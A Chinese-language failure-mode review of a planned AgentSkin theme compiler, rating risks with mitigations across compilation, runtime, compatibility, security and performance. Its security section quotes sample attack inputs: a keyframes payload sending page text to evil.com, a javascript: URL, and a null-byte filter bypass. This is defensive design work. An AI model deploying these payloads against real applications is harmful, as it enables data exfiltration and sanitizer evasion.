# AgentSkin λ 全集成主题编译器 · 深度压力测试（Failure Mode Analysis）

> **对象**: λ 方案 4 阶段管线（Parse → Tokenize → Optimize → Emit）  
> **方法**: 基于现有代码（manifest-validator / safe-css / oklch-utils / bridge-codex-theme / generators）推断失效模式  
> **标准**: P0=服务不可用 / P1=功能受损可降级 / P2=体验下降可规避 / P3=边缘瑕疵  
> **日期**: 2026-08-23 · 纯方案评估，未修改任何代码

---

## 1. 编译期失效

### FM-1.1 Schema 校验级联失败 — P1

**失效模式**：manifest-v2.schema.json 升级至 v3 时，旧主题包因新增 required 字段（如 `animations` 块或 `compiler` 声明）被拦截，导致存量 15 个主题一次性全部编译失败。  
**触发条件**：Parse 阶段对未声明 `schemaVersion: 3` 的包启用严格模式；第三方工具（ThemeStudio v1 / Codex Bridge 历史产物）未同步升级。  
**影响**：构建管线中断；CI 全红；用户已安装主题在新编译器下无法重新生成。  
**缓解**：Parse 层内置 schemaVersion 探测，对 v1/v2 包走 permissive parsing + automatic migration warning，而非 reject；在 `compile.ts` 暴露 `legacy: true` 编译选项，产出 side-by-side diff 报告后再决定是否强制升级。

### FM-1.2 AST Hash 碰撞 — P2

**失效模式**：增量编译基于 AST hash 判定"是否需要重编译"，若 hash 仅取 manifest colors 对象浅哈希，则 `{accent:'#fff', bg:'#000'}` 与 `{bg:'#000', accent:'#fff'}` 产生相同 hash（JS 对象无序），导致配色修改未被识别。更严重的场景：OKLCH 优化后精度截断（`oklchToHex` 当前 10 次二分、~0.1% 精度），两次编译 hash 不同，缓存永远不命中。  
**触发条件**：用户微调 manifest 颜色值但视觉差异不可感知；或优化阶段对不同输入顺序产出不同舍入。  
**影响**：增量缓存形同虚设，14 主题编译回到 8.2s 全量；或相反，变更被误判为未变更，热更新失效。  
**缓解**：AST hash 使用 canonical JSON（键排序 + 固定精度到 0.001）＋内容寻址（sha256 前 16 字节）；编译器设置"精确模式"开关用于 CI，生产模式使用带容差的语义 hash。

### FM-1.3 Gamut Mapping 死循环 — P2

**失效模式**：`oklchToHex`（oklch-utils.mjs:264）用 10 次二分搜索最大 in-gamut chroma，但当 L 接近 0 或 1 时，`oklabToXyz` 计算出的 `l_`/`m_`/`s_` 出现 NaN（负数的复数立方根），导致永远不会落入收敛分支，二分收敛到错误值或直接返回 `#000000`。  
**触发条件**：主题声明纯黑背景 `L=0` 或纯白 `L=1` 的极端 OKLCH 值；Tokenize 阶段将这些极值传入 gamut mapper。  
**影响**：单主题编译挂起或返回错误色值；若 Optimize 阶段无超时机制，整个管线阻塞。  
**缓解**：gamut mapper 入口添加 `Number.isNaN` 断言 + 最大迭代硬上限兜底；对 L<0.01 或 L>0.99 的值直接返回 `#000`/`#fff`，跳过二分；添加 property-based test（fast-check 风格）对 OKLCH 空间随机采样验证收敛。

### FM-1.4 @keyframes 重命名断裂 — P1

**失效模式**：Optimize 阶段意图对 5 个预设动画（aurora/particles/gradient/waves/fade）做 `@keyframes` 命名空间化以避免多主题加载时命名冲突，但若重命名仅替换 `@keyframes aurora` 而遗漏 `animation: aurora 3s` 调用点，则动画静默失效。bridge-codex-theme.mjs 的 CSS 字符串替换已暴露类似脆弱性（:218 `replaceAll('-codex-bridge:', ':')` 可能误伤选择器）。  
**触发条件**：主题 CSS 中存在字符串形式的 keyframes 引用；或 Codex 桥接注入的 CSS 包含同名但不同实现的选择器。  
**影响**：动画全部或局部不动；CDP 注入后用户看到无动画的"半成品"。  
**缓解**：Emit 阶段前做静态分析扫描所有 `animation` / `animation-name` 属性引用，构建引用图后统一重命名；提供"未解析引用"编译警告而非静默丢弃。

### FM-1.5 变量注入递归 — P1

**失效模式**：Tokenize 阶段支持 `var(--agentskin-xxx, fallback)` fallback 链；若主题 manifest 错误声明 `accent: "$accent"`（$ 语法被 Tokenize 解释为引用），且编译器支持 `$xxx` 变量引用，则形成 `$accent → $primary → $accent` 循环引用。  
**触发条件**：第三方主题手动编辑 manifest 的值字段，或 Codex Bridge 将 `--ct-accent-bright` 映射到自身时产生环。  
**影响**：编译期无限递归 → 调用栈溢出 → Node 进程崩溃；若运行在渲染进程则 UI 卡死。  
**缓解**：Tokenize 阶段维护访问集合（visited set），检测到二次访问即抛出 "circular reference" 错误并终止该主题的编译；限制变量解析深度 ≤ 5。

---

## 2. 运行时失效

### FM-2.1 CDP CSS 与宿主冲突 — P0

**失效模式**：Emit 产物通过 `Page.addScriptToEvaluateOnNewDocument` 注入，但 Emit 生成的 `:root` 选择器或 `html` 选择器与宿主应用（如豆包的 `html.agentskin-host-doubao:root` specificity 0,2,1）冲突；若 λ 统一使用单一 specificity 模式，可能在某端被宿主规则覆盖。  
**触发条件**：宿主应用升级 CSS specificity（如从 0,1,1 升至 0,2,1）；或 λ 编译器不了解各 Agent 的 specificity 约定，统一生成 0,1,1。  
**影响**：主题颜色完全失效；用户觉察"应用了一下又回去了"。  
**缓解**：Emit 层为每个 Agent 维护 specificity profile（6 个 JSON 描述文件），编译时读取并生成对应 specificity 选择器；保留现有的 `baseline-css-replay` gate 作为运行时第一道防线。

### FM-2.2 低配动画掉帧 — P1

**失效模式**：5 个预设动画含 `box-shadow` 多层、`blur`、`conic-gradient` 等高 GPU 消耗特性；低配设备（4GB RAM / 集成显卡）下 CDP 注入后渲染 FPS < 15，导致界面卡顿。现有 `reduced-motion` 双层防护可能被 λ 编译器破坏——例如 Emit 输出把 `prefers-reduced-motion` media query 嵌套在错误层中。  
**触发条件**：用户在低配设备启用带动画主题；或系统开启 reduced-motion 但编译器未正确保留查询条件。  
**影响**：用户体验显著降低；与"低配设备优化"目标矛盾。  
**缓解**：Emit 阶段产出 `motion-profile: light | full` 双份产物，runtime 根据设备评分选择；在编译器内嵌"动画复杂度评分"指标，超过阈值强制降级。

### FM-2.3 SourceMap 不匹配 — P2

**失效模式**：JSON SourceMap 记录"CSS 属性 → manifest.json path"映射，但 Optimize 阶段若对 token 做了合并/衍生（如将 accent + secondary 合并为一系列色板），SourceMap 指向的 manifest 路径与实际数据源不一致。  
**触发条件**：Tokenize 阶段生成 derived tokens（OKLCH 色板扩展）；Optimize 阶段做颜色合并优化。  
**影响**：调试时错误定位到非源头字段；开发者修复问题时依据 SourceMap 走到错误位置。  
**缓解**：SourceMap 引入 `sourceType: 'provided' | 'derived' | 'default'` 三元标记（对齐 manifest-v2 schema 的 `colors.inference` 字段）；derived tokens 额外记录 derivation formula。

### FM-2.4 沙箱泄漏 — P1

**失效模式**：若 λ 编译器在独立 Worker 或子进程中运行（Node `child_process` / `worker_threads`），进程隔离不足时，恶意主题通过超深嵌套的 CSS AST 触发 Worker 内存溢出，进而影响主进程；或 OKLCH 数学库的 NaN 路径进入文件系统调用导致异常写入。  
**触发条件**：编译第三方未验证主题包；compiler 子进程权限过大的配置错误。  
**影响**：主进程崩溃；或 Electron 应用整体重启。  
**缓解**：编译器子进程以低权限启动，`execArgv: '--max-old-space-size=256'` 限制内存；CSS 输入做结构深度检测（depth > 50 拒绝）；所有文件 I/O 经主进程代理。

### FM-2.5 热替换动画泄漏 — P2

**失效模式**：Studio 实时编辑模式下，Emit 产物热替换注入时，前一个主题的 `@keyframes` 仍在 DOM 的 `<style>` 标签中活跃，新 keyframes 与旧 keyframes 同名但行为不同，导致动画跳帧或元素处于不可预期状态。  
**触发条件**：Studio 中连续两次 Apply 主题，Apply 间隔短于动画周期；旧 `<style>` 未完全卸载。  
**影响**：视觉闪烁或残留；用户感觉"主题没切干净"。  
**缓解**：注入时为每个主题生成唯一 keyframes 命名空间（基于 epoch-manager 的 epoch + themeId hash）；卸载阶段主动遍历并移除旧 `<style[data-agentskin-epoch]>`。

---

## 3. 跨版本兼容

### FM-3.1 v2 → v3 第三方工具不兼容 — P1

**失效模式**：ThemeStudio v1、外部作者使用的 manifest 编辑器基于 v2 schema；λ 编译器统一 v3 后，这些工具无法产出合规 manifest，或产出被编译器拒绝。  
**触发条件**：社区作者继续使用旧工具发布主题；CI 中 `agentskin verify` 使用 v3 严格模式。  
**影响**：社区主题供给断裂；现有 200+ 第三方主题不可编译。  
**缓解**：提供 `agentskin migrate v2→v3` 自动升级 CLI，保留 v2 输入接口；编译器在 v2 模式下仅对无法自动转换的字段报错（而非整个 manifest 拒绝）；维护 v2 → v3 迁移的破坏性变更日志（CHANGELOG 专项章节）。

### FM-3.2 Codex 桥接 v2 vs v3 严格模式冲突 — P2

**失效模式**：bridge-codex-theme.mjs 当前生成 v2 schema 的 manifest；若 λ 编译器的 Codex import adapter 生成 v3 产物，则 CT_VAR_MAP 映射生成的 14-token 可能缺少 `selection` 字段（当前被 `_accentForSelection` 内部标记取代，Emit 时用 `color-mix` 展开）。v3 若新增 required 字段则桥接产物不合规。  
**触发条件**：用户使用 `agentskin import --from=codex-json` 导入 Codex 主题。  
**影响**：Codex 桥接全部失败；或生成不可用的残缺主题。  
**缓解**：Codex import adapter 明确声明输出 schemaVersion 并在 Emit 前做 completeness check；桥接产物标记 `unofficial: true` + `bridged: true`，让下游工具知道其合规等级；提供 `--strict` / `--lenient` 模式切换。

### FM-3.3 CI 引用旧脚本名 — P2

**失效模式**：λ 消灭 15+ 脚本后，CI workflow 文件（`.github/workflows/*.yml`）、husky hooks、README 示例、CONTRIBUTING 文档中若仍引用 `node scripts/build-palette.mjs` 或 `npm run check:themes`，则 CI 执行失败。  
**触发条件**：合并 λ 分支到 main；开发者按 README 文档执行命令。  
**影响**：CI 红；构建阻断；新成员环境搭建卡住。  
**缓解**：提供层的 shim 阶段——在彻底删除旧脚本前保留 1 个版本的 redirect shim（输出 deprecation warning 后转发到 `agentskin build`）；PR 检查清单新增"grep 旧脚本名"步骤；使用 `npm run check:scripts-gone` 清理验证脚本。

---

## 4. 安全失效

### FM-4.1 恶意 keyframes CSS 注入 — P0

**失效模式**：现有 `safe-css.ts` 的 `sanitizeCSS` 不解析 `@keyframes` 块内容。恶意主题可注入 `@keyframes evil { 100% { background: url('https://evil.com/exfil?data=' + document.body.innerText) } }` + `animation: evil`，利用 CSS animation 触发网络请求绕过 DOMPurify 式防御。  
**触发条件**：用户导入第三方主题包（.agentkin-theme），主题 CSS 含恶意 keyframes；或 Codex 桥接注入的 CSS 被恶意篡改。  
**影响**：数据泄露（页面文本被外传）；钓鱼页面（keyframes 修改 DOM 样式制造假 UI）。  
**缓解**：编译器 Emit 前对最终产物再次运行 `safe-css`（涵盖 `@keyframes` 嵌套 sanitize）；对 `@keyframes` 内 `url()`、`expression()`、`image-set()` 做专项过滤；CDP 注入端启用 `Content-Security-Policy` 阻止未授权外联。

### FM-4.2 URL 跳转攻击 — P1

**失效模式**：恶意 CSS 通过 `cursor` 属性隐藏指针 + `::before` 全屏透明覆盖层模拟"假按钮"，或利用 `background: url('javascript:alert(1)')`（现代浏览器已禁，但 Chromium 旧版/Edge 仍可能执行）。  
**触发条件**：safe-css 的 `BLOCKED_VALUE_PATTERNS` 漏掉某变异写法（如 `java\0script:` 空字节绕过）。  
**影响**：用户点击"主题卡片"后执行恶意代码；或视觉欺骗。  
**缓解**：safe-css 扫描增加 Unicode 规范化 + 空字节清除预处理；compiler Emit 产物加 integrity hash（sha256-base64），CDP 注入端校验哈希匹配后才应用。

### FM-4.3 沙箱命令执行 — P0

**失效模式**：若 λ 编译器在独立进程运行并通过 stdio 与主进程通信，恶意序列化的 AST 可能在反序列化时触发原型链污染；或在 compiler 子进程中通过构造` execSync` 调用逃脱沙箱。更现实的风险：compiler 子进程依赖的某个第三方库（如未来引入 `postcss`）被投毒，在编译期在主进程上下文中执行任意代码。  
**触发条件**：引入新的 npm 依赖到 compiler；或 compiler 子进程的 `NODE_OPTIONS` 可注入。  
**影响**：主机被接管；用户数据被窃取。  
**缓解**：compiler 核心保持**零外部依赖**（与当前 `oklch-utils.mjs` 一致的 zero-dependency 策略）；子进程禁用 `eval`/`Function` 构造器（`vm.runInContext` 隔离）；对 compiler 依赖做 lockfile 审计 + SRI。

---

## 5. 性能失效

### FM-5.1 低配首次编译超时 — P1

**失效模式**：14 主题 × 6 agent × N scheme 全量编译，低端设备（2 核 / 4GB）首次构建（无缓存）耗时可能 > 30s，阻塞 CI 或首启 bootstrap 流程（boot-sequence.ts 依赖编译产物就绪）。  
**触发条件**：用户首次安装 AgentSkin；CI 清除缓存后重新构建；或增量缓存损坏触发全量回退。  
**影响**：启动超时崩溃；CI 任务被 kill；开发者心流中断。  
**缓解**：编译器支持并行度配置（默认 `min(4, cpus-1)`），低配设备自动降为串行；Emit 改为 streaming 模式——每完成一个主题立即写磁盘并通知主进程，不必等全部完成；提供预热缓存（precomputed build cache）随安装包分发。

### FM-5.2 84 文件 I/O 阻塞 — P2

**失效模式**：单主题 Emit 产出 6 agent CSS + palette.css + animations.css + variableBridge.css + sourcemap JSON = ~10 文件，14 主题 = ~140 文件。若使用同步 `writeFileSync`（如 build-palette.mjs 当前实现），主线程 / compiler 进程被 I/O 阻塞。  
**触发条件**：磁盘慢（机械硬盘 / 网络挂载 / Windows Defender 实时扫描）；CI 容器 I/O 抖动。  
**影响**：编译耗时从优化预期的 0.4s 退化到 5s+；I/O 抖动时编译时间方差大、不可预测。  
**缓解**：全部 Emit 路径改用 `fs.promises.writeFile` + 并发控制（p-limit 风格 MAX_CONCURRENT_WRITES=8）；在内存文件系统中先构建完整产物树，最后 `rename` 原子落盘；写文件前先比较 hash，未变更跳过。

### FM-5.3 SourceMap 体积爆炸 — P2

**失效模式**：每个 CSS 属性映射 manifest path，单主题 manifest 含 14 核心 token + N extended colors + OKLCH 色板（10 步 × 6 agent × 10 步 = 600+ 派生色），SourceMap JSON 可能 > 1MB。14 主题总 SourceMap 达 14MB+，挤占 Electron 安装包体积和运行时内存。  
**触发条件**：主题启用完整色板扩展（Catppuccin 26 色派生）；SourceMap 启用 verbose 模式记录每一步 derivation formula。  
**影响**：安装包膨胀；低配机器加载 SourceMap 时主进程 GC 抖动。  
**缓解**：SourceMap 默认使用 compact 模式（仅记录用户可见 tokens，derived tokens 在查询时按需展开）；提供 gzip 压缩的 `.map.gz`；verbose SourceMap 仅 `agentskin build --debug` 模式启用。

### FM-5.4 缓存磁盘无上限 — P2

**失效模式**：增量编译缓存目录（如 `.agentskin-cache/`）持续积累 AST hash + 中间产物，用户长期使用后可达 GB 级。当前 oklch-utils 与 theme-utils 均无缓存层，λ 引入缓存后若未设上限，等同新引入存储泄漏。  
**触发条件**：频繁修改 manifest 编辑主题；CI 每次运行产生独立缓存；硬盘空间不足时缓存无清理。  
**影响**：磁盘占满；低存储笔记本用户系统告警；SSD 寿命损耗。  
**缓解**：缓存目录配置 max-size（默认 256MB）+ LRU 淘汰；`cache.json` 记录总大小并周期性执行 trim；提供 `agentskin cache --clean` CLI；CI 环境默认禁用持久缓存或每次 run 清理。

---

## 风险汇总矩阵

| ID | 失效模式 | 评级 | 触发概率 | 影响面 | 首阶段需解决 |
|:-----------|:--------:|:------:|:--------:|:----------:|
| FM-1.1 | Schema 校验级联失败 | P1 | 中 | 存量主题兼容 | Parse |
| FM-1.2 | AST Hash 碰撞 | P2 | 中 | 增量缓存失效 | Optimize |
| FM-1.3 | Gamut Mapping 死循环 | P2 | 低 | 极端色值编译阻塞 | Tokenize |
| FM-1.4 | @keyframes 重命名断裂 | P1 | 中 | 动画静默失效 | Optimize |
| FM-1.5 | 变量注入递归 | P1 | 低 | 编译器崩溃 | Tokenize |
| **FM-2.1** | **CDP CSS 与宿主冲突** | **P0** | 中 | 主题完全失效 | Emit |
| FM-2.2 | 低配动画掉帧 | P1 | 中 | 体验退化 | Emit + Runtime |
| FM-2.3 | SourceMap 不匹配 | P2 | 中 | 调试误导 | Emit |
| FM-2.4 | 沙箱泄漏 | P1 | 低 | 进程隔离失效 | Runtime |
| FM-2.5 | 热替换动画泄漏 | P2 | 中 | 视觉残留 | Runtime |
| FM-3.1 | v2→v3 第三方工具不兼容 | P1 | 高 | 社区主题供给 | Parse + CLI |
| FM-3.2 | Codex 桥接 v2/v3 冲突 | P2 | 中 | 桥接失败 | Parse |
| FM-3.3 | CI 引用旧脚本名 | P2 | 高 | 红 CI | Process |
| **FM-4.1** | **恶意 keyframes CSS 注入** | **P0** | 低 | 数据泄露 | Emit + Runtime |
| FM-4.2 | URL 跳转攻击 | P1 | 低 | 钓鱼 / XSS | Emit + Runtime |
| **FM-4.3** | **沙箱命令执行** | **P0** | 低 | 主机接管 | Runtime |
| FM-5.1 | 低配首次编译超时 | P1 | 中 | 启动 / CI 失败 | Emit |
| FM-5.2 | 84 文件 I/O 阻塞 | P2 | 中 | 编译耗时抖动 | Emit |
| FM-5.3 | SourceMap 体积爆炸 | P2 | 中 | 包膨胀 + 内存 | Emit |
| FM-5.4 | 缓存磁盘无上限 | P2 | 中 | 磁盘泄漏 | Optimize |

---

## 结论与建议

**λ 方案总评**：4 阶段管线设计合理，消灭 15+ 脚本的收益真实。但压力测试暴露 **3 个 P0**，若不解决则上线等同于给 AgentSkin 引入系统性脆弱点：

1. **FM-2.1（CDP 冲突）** + **FM-4.1（keyframes 注入）** 直接关联"运行时第一公里"——Emit 产物若未通过 safe-css 再处理且 specificity 与宿主不匹配，会在第一时间被用户感知为"主题坏掉了"。
2. **FM-4.3（沙箱命令执行）** 建议在 λ 立项阶段就写入"零外部依赖"红线，避免编译器本身成为供应链攻击入口。

**推荐执行顺序**：先建立 Emit 层的安全与兼容性护栏（specificity profile + 产物质检），再实现 Tokenize/Optimize 内部逻辑，最后做 CLI 迁移与缓存层——"先安全、再正确、后性能"。

**后续动作**（非本次评估范围）：为每个 P0/P1 编写回归测试用例，纳入 `agentskin check` 质量门禁；对 FM-1.3 gamut mapper 做 property-based 测试覆盖 OKLCH 空间边界。
